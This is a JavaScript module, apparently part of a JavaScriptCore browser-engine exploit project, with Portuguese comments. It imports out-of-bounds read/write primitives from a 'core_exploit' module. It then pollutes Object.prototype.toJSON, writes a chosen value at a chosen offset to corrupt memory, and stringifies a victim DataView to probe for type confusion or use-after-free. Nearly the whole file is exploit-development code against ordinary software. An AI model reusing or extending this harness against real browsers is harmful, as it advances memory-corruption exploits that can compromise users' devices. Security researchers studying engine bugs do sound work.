// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Contador global, embora a toJSON não deva usá-lo para evitar TypeError.
export let current_toJSON_call_count_for_TypeError_test = 0;

// Nova toJSON para sondar um DataView
function toJSON_ProbeDataViewVictim() {
    // Evitar operações que causaram TypeError anteriormente (contador global, logS3 direto, document.title)
    
    let results = {
        toJSON_executed: "toJSON_ProbeDataViewVictim",
        this_type: "N/A",
        is_dataview: false,
        dv_buffer_accessible: false,
        dv_buffer_byteLength: "N/A",
        dv_byteLength: "N/A",
        dv_byteOffset: "N/A",
        dv_read_val_at_0: "N/A",
        dv_read_error: null,
        new_dv_from_buffer_read_val: "N/A",
        new_dv_from_buffer_error: null,
        error_in_toJSON: null
    };

    try {
        results.this_type = Object.prototype.toString.call(this);

        if (this instanceof DataView) {
            results.is_dataview = true;
            
            // Sondar propriedades do DataView
            try {
                results.dv_byteLength = this.byteLength;
                results.dv_byteOffset = this.byteOffset;
                if (this.buffer instanceof ArrayBuffer) {
                    results.dv_buffer_accessible = true;
                    results.dv_buffer_byteLength = this.buffer.byteLength;
                }
            } catch (e_prop) {
                results.error_in_toJSON = `Error accessing DataView props: ${e_prop.name} - ${e_prop.message}`;
            }

            // Tentar ler diretamente do DataView (this)
            if (results.is_dataview && this.byteLength >= 4) {
                try {
                    results.dv_read_val_at_0 = this.getUint32(0, true);
                } catch (e_dv_read) {
                    results.dv_read_error = `Error this.getUint32: ${e_dv_read.name} - ${e_dv_read.message}`;
                }
            } else if (results.is_dataview) {
                 results.dv_read_error = "DataView too small for getUint32(0)";
            }
            
            // Tentar criar nova DataView a partir do this.buffer e ler
            if (results.dv_buffer_accessible && this.buffer.byteLength >= 4) {
                try {
                    let new_dv = new DataView(this.buffer, 0, 4);
                    results.new_dv_from_buffer_read_val = new_dv.getUint32(0, true);
                } catch (e_new_dv) {
                    results.new_dv_from_buffer_error = `Error new DataView(this.buffer): ${e_new_dv.name} - ${e_new_dv.message}`;
                }
            } else if (results.dv_buffer_accessible) {
                 results.new_dv_from_buffer_error = "this.buffer too small for getUint32(0)";
            }

        } else {
            results.error_in_toJSON = "this is not a DataView instance";
        }
    } catch (e_outer) {
        results.error_in_toJSON = results.error_in_toJSON || `Outer Exception in toJSON: ${e_outer.name}: ${e_outer.message}`;
    }
    
    return results;
}


export async function executeFocusedTestForDataViewVictim( // Nome da função atualizado
    testDescription,
    // toJSONFunctionToUse será hardcoded para toJSON_ProbeDataViewVictim
    valueToWriteOOB,
    corruptionOffsetToTest
) {
    const FNAME = `executeFocusedTestForDataViewVictim<${testDescription}>`;
    logS3(`--- Iniciando Teste Focado (DataView Victim): ${testDescription} ---`, "test", FNAME);
    logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)}`, "info", FNAME);
    document.title = `Iniciando DV Victim: ${testDescription}`;

    current_toJSON_call_count_for_TypeError_test = 0; 

    const underlying_ab_size_val = 64;
    const bytes_to_write_val = 4;
    const ppKey_val = 'toJSON';

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME);
        document.title = "ERRO OOB Setup - " + FNAME;
        return { errorOccurred: new Error("OOB Setup Failed"), calls: 0, potentiallyCrashed: false, stringifyResult: null };
    }
    document.title = "OOB OK - " + FNAME;

    let underlying_ab = new ArrayBuffer(underlying_ab_size_val);
    let dataView_victim = new DataView(underlying_ab); // A VÍTIMA AGORA É UM DATAVIEW
    logS3(`DataView vítima (sobre AB de ${underlying_ab_size_val} bytes) recriado.`, "info", FNAME);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let stepReached = "antes_pp";
    let potentiallyCrashed = true; 
    let errorCaptured = null;
    let stringifyResult = null;

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${ppKey_val} com toJSON_ProbeDataViewVictim...`, "info", FNAME);
        document.title = `Aplicando PP (${testDescription})`;
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_ProbeDataViewVictim, // Usando a toJSON específica para DataView
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada com toJSON_ProbeDataViewVictim.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = `PP OK (${testDescription})`;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO: ${toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)}`, "warn", FNAME);
        document.title = `Antes OOB Write (${toHex(corruptionOffsetToTest)})`;
        oob_write_absolute(corruptionOffsetToTest, valueToWriteOOB, bytes_to_write_val);
        logS3("Escrita OOB feita.", "info", FNAME);
        stepReached = "apos_escrita_oob";
        document.title = `Após OOB Write (${toHex(corruptionOffsetToTest)})`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify";
        document.title = `Antes Stringify DV (${toHex(corruptionOffsetToTest)})`;
        logS3(`Chamando JSON.stringify(dataView_victim) (com ${testDescription})...`, "info", FNAME);
        
        try {
            stringifyResult = JSON.stringify(dataView_victim); // STRINGIFICANDO O DATAVIEW
            stepReached = `apos_stringify`;
            potentiallyCrashed = false; 
            document.title = `Strfy DV OK (${testDescription})`;
            logS3(`Resultado JSON.stringify: ${String(stringifyResult)}`, "info", FNAME); // Log completo
        } catch (e) {
            stepReached = `erro_stringify`;
            potentiallyCrashed = false; 
            errorCaptured = e;
            document.title = `ERRO Strfy DV (${e.name}) - ${testDescription}`;
            logS3(`ERRO CAPTURADO JSON.stringify(dataView_victim): ${e.name} - ${e.message}.`, "critical", FNAME);
            if (e.stack) logS3(`   Stack: ${e.stack}`, "error");
            console.error(`JSON.stringify ERROR (DataView Victim - ${testDescription}):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false;
        errorCaptured = mainError;
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = "ERRO Principal DV - " + FNAME;
        if (mainError.stack) logS3(`   Stack: ${mainError.stack}`, "error");
        console.error("Main test error (DataView Victim):", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}.`, "info", FNAME);
        if (potentiallyCrashed) {
             document.title = `CONGELOU DV? ${stepReached} - ${FNAME}`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO (DataView Victim) em ${stepReached}.`, "error", FNAME);
        }
    }
    logS3(`--- Teste Focado (DataView Victim) Concluído: ${testDescription} ---`, "test", FNAME);
    if (!potentiallyCrashed && !errorCaptured) {
        document.title = `Teste DV Concluído OK - ${testDescription}`;
    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy DV")) { 
        document.title = `ERRO OCORREU DV (${errorCaptured.name}) - ${testDescription}`;
    }
    return { errorOccurred: errorCaptured, calls: 1, /* Assumindo 1 chamada à toJSON */ potentiallyCrashed, stringifyResult };
}
